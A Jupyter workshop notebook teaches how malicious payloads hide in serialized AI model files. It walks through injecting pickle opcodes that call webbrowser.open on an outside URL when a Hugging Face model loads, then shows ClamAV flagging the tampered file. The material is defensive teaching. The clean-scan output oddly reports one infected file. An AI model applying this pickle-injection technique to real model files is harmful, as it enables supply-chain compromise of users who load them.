{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "5e96ae70-8888-4fcd-9aee-11902e356581",
   "metadata": {},
   "source": [
    "# Models as Malware: Attacking and Defending the AI Supply Chain\n",
    "The open source model development community is growing exponentially, with over 1.8 million publicly accessible models on HuggingFace today.\n",
    "\n",
    "Institutions and individuals alike leverage this platform to access and share state-of-the-art AI for deployment on a wide range of infrastructure, from personal devices to production systems.\n",
    "\n",
    "Under the hood, many AI model formats are both data (weights) and code (architecture), with most users relying on easy but vulnerable serialization formats to distribute models â€” and attackers are taking notice, embedding payloads in models to connect to C2 servers:\n",
    "- https://thehackernews.com/2025/02/malicious-ml-models-found-on-hugging.html (Feb 2025)\n",
    "- https://arstechnica.com/security/2024/03/hugging-face-the-github-of-ai-hosted-code-that-backdoored-user-devices/ (Mar 2024)\n",
    "\n",
    "In this session, you'll learn 1) how to instrument and detect malicious payloads in AI models and 2) how recent enhancements to ClamAV are protecting customers from supply chain compromises in the era of AI.\n",
    "\n",
    "Working understanding of Python programming is expected."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9d60391d-32b0-4890-8a1b-83f46d318cc4",
   "metadata": {},
   "source": [
    "# Analyze the new threat vector"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9ca1a7a9-7b18-4bd4-b6ad-664f8fe6a633",
   "metadata": {},
   "source": [
    "## Load a safe model\n",
    "In this case, it's a small GPT-style model trained on Shakespeare's plays. Feel free to try it out!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "5bea39c1-f2bc-4e07-969c-28c855e3413f",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "a3c7740f7a2c410780c1def35a998f79",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "config.json:   0%|          | 0.00/388 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "ce16c4a7c3fe45b1a8910d8d6be52be2",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "model.py: 0.00B [00:00, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "A new version of the following files was downloaded from https://huggingface.co/n8cha/nanoGPT-shakespeare-char:\n",
      "- model.py\n",
      ". Make sure to double-check they do not contain any added malicious code. To avoid downloading new versions of the code file, you can pin a revision.\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "bc22026c2f2c4551b48a8c491a8b7ea9",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "pytorch_model.bin:   0%|          | 0.00/43.0M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "number of parameters: 10.67M\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "55105c586d934eb8af6024cce75e9ed6",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "generation_config.json:   0%|          | 0.00/69.0 [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "2cfed83080b748ea9a0638ef96c62b78",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "model.safetensors:   0%|          | 0.00/43.0M [00:00<?, ?B/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "from transformers import AutoModel\n",
    "model = AutoModel.from_pretrained(\"n8cha/nanoGPT-shakespeare-char\", weights_only=False, trust_remote_code=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "f8a921da-402e-4660-a35b-4802f12613c2",
   "metadata": {},
   "outputs": [],
   "source": [
    "import torch\n",
    "\n",
    "class CharTokenizer:\n",
    "    def __init__(self):\n",
    "        self.token_map = {'\\n': 0, ' ': 1, '!': 2, '$': 3, '&': 4, \"'\": 5, ',': 6, '-': 7, '.': 8, '3': 9, ':': 10, ';': 11, '?': 12, 'A': 13, 'B': 14, 'C': 15, 'D': 16, 'E': 17, 'F': 18, 'G': 19, 'H': 20, 'I': 21, 'J': 22, 'K': 23, 'L': 24, 'M': 25, 'N': 26, 'O': 27, 'P': 28, 'Q': 29, 'R': 30, 'S': 31, 'T': 32, 'U': 33, 'V': 34, 'W': 35, 'X': 36, 'Y': 37, 'Z': 38, 'a': 39, 'b': 40, 'c': 41, 'd': 42, 'e': 43, 'f': 44, 'g': 45, 'h': 46, 'i': 47, 'j': 48, 'k': 49, 'l': 50, 'm': 51, 'n': 52, 'o': 53, 'p': 54, 'q': 55, 'r': 56, 's': 57, 't': 58, 'u': 59, 'v': 60, 'w': 61, 'x': 62, 'y': 63, 'z': 64}\n",
    "        self.rev_map = {v: k for k, v in self.token_map.items()}\n",
    "\n",
    "    def encode(self, text):\n",
    "        try:\n",
    "            return [self.token_map[c] for c in text]\n",
    "        except KeyError as e:\n",
    "            raise ValueError(f\"Character not in vocabulary: {e.args[0]}\")\n",
    "\n",
    "    def decode(self, tokens):\n",
    "        try:\n",
    "            return ''.join(self.rev_map[t] for t in tokens)\n",
    "        except KeyError as e:\n",
    "            raise ValueError(f\"Token not in vocabulary: {e.args[0]}\")\n",
    "\n",
    "tokenizer = CharTokenizer()\n",
    "\n",
    "def generate(prompt):\n",
    "    prompt_encoded = tokenizer.encode(prompt)\n",
    "    x = (torch.tensor(prompt_encoded, dtype=torch.long, device=\"cpu\")[None, ...])\n",
    "    with torch.no_grad():\n",
    "        y = model.generate(\n",
    "            x,\n",
    "            max_new_tokens=1000,\n",
    "            temperature=0.8,\n",
    "            top_k=200\n",
    "        )\n",
    "        return tokenizer.decode(y[0].tolist())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "9130e629-6b7a-4acc-b5b8-ca210c1741bb",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "O Romeo, Romeo, like the talk of death\n",
      "Have no longer to do another blood.\n",
      "\n",
      "MENENIUS:\n",
      "But it was a brace of thee,\n",
      "To make thy fellow to have one shadow:\n",
      "For it is a well-a grave!\n",
      "\n",
      "First Senator:\n",
      "What satisfied?\n",
      "\n",
      "VOLUMNIA:\n",
      "Sir, the black down from the dukes\n",
      "For merit, but not into the virtuous life\n",
      "Of fasting but another of all the tempted like:\n",
      "The prayers ever will blood to the extreme fear,\n",
      "That thought you leave the foul purposed souls of yound days\n",
      "And despair told me in his kindness,\n",
      "May proclaim your ancient for a bush of feast,\n",
      "Lest with a guilty plague may seem that with me;\n",
      "And as I was this a bear, many as runs\n",
      "Good cannot be will the be but knew'd,\n",
      "And death happiness, means their courts, we have many inhabits\n",
      "The hope of pleasure to die: 'tis so dear a tranion\n",
      "To see him and pieces which we have been side a travell\n",
      "That most desperate sleep in the cener? See, thou shamest;\n",
      "And so, but if thou dost pity the allaying these\n",
      "to make a death with a bloody man\n",
      "That thus should be stander'd in a \n"
     ]
    }
   ],
   "source": [
    "response = generate(\"O Romeo, Romeo, \") # This may take a while to run (~60s)\n",
    "print(response)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e9d52850-f683-48ba-9a3d-bdc10f266415",
   "metadata": {},
   "source": [
    "## Instrument the model with (simulated) malware\n",
    "During the guided session, we will use `pickle_editor.py` to instrument the serialized model file with malicious instructions.\n",
    "\n",
    "The simulated exploit looks like this:\n",
    "```\n",
    "001: GLOBAL 'webbrowser open'\n",
    "002: BINUNICODE 'https://pramuwaskito.org/hacker/'\n",
    "003: BININT1 0\n",
    "004: NEWTRUE\n",
    "005: TUPLE3\n",
    "006: REDUCE\n",
    "```\n",
    "\n",
    "1. `001: GLOBAL 'webbrowser open'`: Pushes the `webbrowser.open()` function onto the stack.\n",
    "2. `002: BINUNICODE 'https://pramuwaskito.org/hacker/'`: Loads up the first parameter of `webbrowser.open()`, `url`.\n",
    "3. `003: BININT1 0`: Loads up the second parameter of `webbrowser.open()`, `new`.\n",
    "4. `004: NEWTRUE`: Loads up the third parameter of `webbrowser.open()`, `autoraise`. We'll use `True` for transparency.\n",
    "5. `005: TUPLE3`: Assembles the previous 3 items into a tuple (necessary to pass the items to `webbrowser.open()` altogether).\n",
    "6. `006: REDUCE`: Executes `webbrowser.open()`."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ee575704-5842-481b-ab82-87ab186d9c45",
   "metadata": {},
   "source": [
    "### Open the Pickle editor tool\n",
    "Check the Hugging Face cache for the model files:\n",
    "```shell\n",
    "# Hugging Face stores the model data in a cache directory using the SHA256 checksum as the filename\n",
    "# SHA256 of model: 174042ea4a88354667f5058c9fa8090140c9fdad6373e7f76dbaf4e17b92d575\n",
    "# (see https://huggingface.co/n8cha/nanoGPT-shakespeare-char/blob/main/pytorch_model.bin)\n",
    "ls -la ~/.cache/huggingface/hub/models--n8cha--nanoGPT-shakespeare-char/blobs\n",
    "```\n",
    "\n",
    "Save a copy of the \"clean\" model for later:\n",
    "```shell\n",
    "cp ~/.cache/huggingface/hub/models--n8cha--nanoGPT-shakespeare-char/blobs/174042ea4a88354667f5058c9fa8090140c9fdad6373e7f76dbaf4e17b92d575 ~/.cache/huggingface/hub/models--n8cha--nanoGPT-shakespeare-char/blobs/clean_174042ea4a88354667f5058c9fa8090140c9fdad6373e7f76dbaf4e17b92d575\n",
    "\n",
    "ls -la ~/.cache/huggingface/hub/models--n8cha--nanoGPT-shakespeare-char/blobs\n",
    "```\n",
    "\n",
    "Instrument the original model with the malicious pickle opcodes listed above (this will open a `curses` editor):\n",
    "```shell\n",
    "python pickle_editor.py ~/.cache/huggingface/hub/models--n8cha--nanoGPT-shakespeare-char/blobs/174042ea4a88354667f5058c9fa8090140c9fdad6373e7f76dbaf4e17b92d575\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "56dc7d46-2577-4e34-8fd9-49fdbc98bcb7",
   "metadata": {},
   "source": [
    "## Test the exploit!\n",
    "If all succeeds, loading the tampered model will run the malicious instructions, opening a web browser window to https://pramuwaskito.org/hacker/. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4e679661-3f3a-4c63-af5f-e2a922798dd4",
   "metadata": {},
   "outputs": [],
   "source": [
    "from transformers import AutoModel\n",
    "model = AutoModel.from_pretrained(\"n8cha/nanoGPT-shakespeare-char\", weights_only=False, trust_remote_code=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4f272195-3b9c-4b96-a10d-cef950c52a65",
   "metadata": {},
   "source": [
    "# Detect (and protect) with ... ClamAV?!?\n",
    "There's a new model on Hugging Face every 7 seconds, and **manually analyzing the contents of every model simply will not scale**.\n",
    "\n",
    "If only we could leverage the _tried and true_ tools in our toolkits today ... like **ClamAV**.\n",
    "\n",
    "---\n",
    "\n",
    "That's right, **ClamAV** can now detect malicious signatures in AI model files, and you can try it yourself right now!"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d3e55bd4-c3a1-42e3-967f-0efc4f63db63",
   "metadata": {},
   "source": [
    "### Original model\n",
    "\n",
    "```\n",
    "> clamscan ~/.cache/huggingface/hub/models--n8cha--nanoGPT-shakespeare-char/blobs/clean_174042ea4a88354667f5058c9fa8090140c9fdad6373e7f76dbaf4e17b92d575\n",
    "\n",
    "Loading:     7s, ETA:   0s [========================>]    8.72M/8.72M sigs\n",
    "Compiling:   2s, ETA:   0s [========================>]       41/41 tasks\n",
    "\n",
    "/nanoGPT-shakespeare-char/pytorch_model.bin: OK\n",
    "\n",
    "----------- SCAN SUMMARY -----------\n",
    "Known viruses: 8718486\n",
    "Engine version: 1.4.2\n",
    "Scanned directories: 0\n",
    "Scanned files: 1\n",
    "Infected files: 1\n",
    "Data scanned: 62.07 MB\n",
    "Data read: 41.00 MB (ratio 1.51:1)\n",
    "Time: 0.501 sec (0 m 0 s)\n",
    "Start Date: 2025:07:31 23:22:55\n",
    "End Date:   2025:07:31 23:22:56\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0fe32326-82ce-4ece-ab06-5995dfc77e2d",
   "metadata": {},
   "source": [
    "### Tampered model\n",
    "\n",
    "```\n",
    "> clamscan ~/.cache/huggingface/hub/models--n8cha--nanoGPT-shakespeare-char/blobs/174042ea4a88354667f5058c9fa8090140c9fdad6373e7f76dbaf4e17b92d575\n",
    "\n",
    "Loading:     7s, ETA:   0s [========================>]    8.72M/8.72M sigs\n",
    "Compiling:   2s, ETA:   0s [========================>]       41/41 tasks\n",
    "\n",
    "/.cache/huggingface/hub/models--n8cha--nanoGPT-shakespeare-char/blobs/174042ea4a88354667f5058c9fa8090140c9fdad6373e7f76dbaf4e17b92d575: Py.Malware.NetAccess_webbrowser_G-10053733-0 FOUND\n",
    "\n",
    "----------- SCAN SUMMARY -----------\n",
    "Known viruses: 8718486\n",
    "Engine version: 1.4.2\n",
    "Scanned directories: 0\n",
    "Scanned files: 1\n",
    "Infected files: 1\n",
    "Data scanned: 62.07 MB\n",
    "Data read: 41.00 MB (ratio 1.51:1)\n",
    "Time: 0.501 sec (0 m 0 s)\n",
    "Start Date: 2025:07:31 23:22:55\n",
    "End Date:   2025:07:31 23:22:56\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dc848a27-0ff4-47d1-9aaa-f59943086dea",
   "metadata": {},
   "source": [
    "### Clean up the Hugging Face cache\n",
    "If you'd like to remove the instrumented model, simply clear out the Hugging Face cache, and a fresh copy of the model will be pulled the next time `from_pretrained()` is invoked:\n",
    "```shell\n",
    "rm -rf ~/.cache/huggingface/hub/models--n8cha--nanoGPT-shakespeare-char\n",
    "````"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "579228f7-6b94-4cac-bd53-04845138d993",
   "metadata": {},
   "source": [
    "## We hope you enjoyed this exercise and would love to stay in touch!\n",
    "**Nathan**: [LinkedIn](https://www.linkedin.com/in/thisisnathanchang/), [GitHub](https://github.com/n8cha), `nathchan at cisco dot com`\n",
    "\n",
    "**Roee**: [LinkedIn](https://www.linkedin.com/in/rlandesman/), [GitHub](https://github.com/ri-roee), `roeeland at cisco dot com`"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
